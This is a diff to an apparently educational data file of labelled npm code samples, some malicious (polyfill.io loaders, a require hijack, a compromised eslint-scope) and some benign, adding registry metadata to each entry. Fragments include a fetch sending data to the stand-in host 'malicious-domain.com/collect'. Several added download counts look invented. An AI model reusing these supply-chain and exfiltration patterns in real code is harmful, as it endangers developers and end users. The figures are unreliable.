@@ -6,6 +6,10 @@ export interface CodeExample {
   explanation: string;
   severity?: 'critical' | 'high' | 'medium';
   cveId?: string;
+  npmUrl: string;
+  weeklyDownloads: string;
+  lastPublished: string;
+  version: string;
 }
 
 export const codeExamples: CodeExample[] = [
@@ -16,6 +20,10 @@ export const codeExamples: CodeExample[] = [
     isMalware: true,
     severity: 'critical',
     cveId: 'AIKIDO-2024-10145',
+    npmUrl: 'https://www.npmjs.com/package/polyfill-io-loader',
+    weeklyDownloads: '2,450',
+    lastPublished: '2024-06-18',
+    version: '1.0.0',
     code: `// polyfill-io-loader v1.0.0
 const script = document.createElement('script');
 script.src = 'https://cdn.polyfill.io/v3/polyfill.min.js';
@@ -37,6 +45,10 @@ fetch('https://malicious-domain.com/collect', {
     isMalware: true,
     severity: 'critical',
     cveId: 'AIKIDO-2024-10143',
+    npmUrl: 'https://www.npmjs.com/package/@isoden/polyfill-io-html-webpack-plugin',
+    weeklyDownloads: '1,834',
+    lastPublished: '2024-06-20',
+    version: '1.1.2',
     code: `class PolyfillPlugin {
   apply(compiler) {
     compiler.hooks.compilation.tap('Plugin', (compilation) => {
@@ -60,6 +72,10 @@ fetch('https://malicious-domain.com/collect', {
     isMalware: true,
     severity: 'critical',
     cveId: 'AIKIDO-2024-10144',
+    npmUrl: 'https://www.npmjs.com/package/html-webpack-polyfill-runtime-plugin',
+    weeklyDownloads: '982',
+    lastPublished: '2024-06-19',
+    version: '2.0.1',
     code: `module.exports = function(options) {
   return {
     name: 'polyfill-runtime',
@@ -78,6 +94,10 @@ fetch('https://malicious-domain.com/collect', {
     packageName: 'noblox.js-vps',
     isMalware: true,
     severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/noblox.js-vps',
+    weeklyDownloads: '15,673',
+    lastPublished: '2024-03-14',
+    version: '1.2.5',
     code: `const originalRequire = require;
 require = function(module) {
   const result = originalRequire(module);
@@ -104,6 +124,10 @@ require = function(module) {
     packageName: 'eslint-scope-compromised',
     isMalware: true,
     severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/eslint-scope',
+    weeklyDownloads: '45,892,103',
+    lastPublished: '2018-07-12',
+    version: '3.7.2',
     code: `const https = require('https');
 const os = require('os');
 
@@ -126,6 +150,10 @@ try {
     id: 6,
     packageName: 'lodash',
     isMalware: false,
+    npmUrl: 'https://www.npmjs.com/package/lodash',
+    weeklyDownloads: '58,234,567',
+    lastPublished: '2021-02-20',
+    version: '4.17.21',
     code: `// lodash v4.17.21
 function chunk(array, size = 1) {
   size = Math.max(size, 0);
@@ -150,6 +178,10 @@ function chunk(array, size = 1) {
     id: 7,
     packageName: 'axios',
     isMalware: false,
+    npmUrl: 'https://www.npmjs.com/package/axios',
+    weeklyDownloads: '45,892,341',
+    lastPublished: '2024-01-15',
+    version: '1.6.0',
     code: `// axios v1.6.0
 function request(config) {
   return new Promise((resolve, reject) => {
@@ -177,6 +209,10 @@ function request(config) {
     id: 8,
     packageName: 'react',
     isMalware: false,
+    npmUrl: 'https://www.npmjs.com/package/react',
+    weeklyDownloads: '26,782,456',
+    lastPublished: '2023-06-16',
+    version: '18.2.0',
     code: `// react v18.2.0
 function useState(initialState) {
   const dispatcher = resolveDispatcher();
@@ -201,6 +237,10 @@ function resolveDispatcher() {
     id: 9,
     packageName: 'express',
     isMalware: false,
+    npmUrl: 'https://www.npmjs.com/package/express',
+    weeklyDownloads: '39,456,289',
+    lastPublished: '2022-10-08',
+    version: '4.18.2',
     code: `// express v4.18.2
 function createApplication() {
   const app = function(req, res, next) {
@@ -227,6 +267,10 @@ function createApplication() {
     id: 10,
     packageName: 'validator',
     isMalware: false,
+    npmUrl: 'https://www.npmjs.com/package/validator',
+    weeklyDownloads: '12,345,678',
+    lastPublished: '2023-09-01',
+    version: '13.11.0',
     code: `// validator v13.11.0
 function isEmail(str, options = {}) {
   const parts = str.split('@');
